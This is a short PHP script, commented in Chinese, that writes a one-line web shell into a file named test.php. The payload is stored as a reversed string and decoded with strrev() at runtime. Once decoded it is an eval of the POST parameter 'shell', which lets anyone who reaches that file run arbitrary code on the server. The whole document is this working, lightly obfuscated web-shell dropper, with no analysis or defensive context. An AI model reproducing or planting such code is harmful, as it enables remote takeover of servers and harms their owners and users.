<?php
// 指定文件路径
$path = "./test.php";
// 检查文件是否存在，如果不存在则创建
if (!file_exists($path)) {
    touch($path);
}
// 打开文件
$file = fopen($path, "w") or die("Unable to open file!");
// 定义要写入的字符串(一句话木马)
$str = ">? ;)]\"llehs\"[TSOP_$(lave@ php?<";
// 将字符串倒序
$str = strrev($str);
// 写入字符串
fwrite($file, $str);
// 关闭文件
fclose($file);
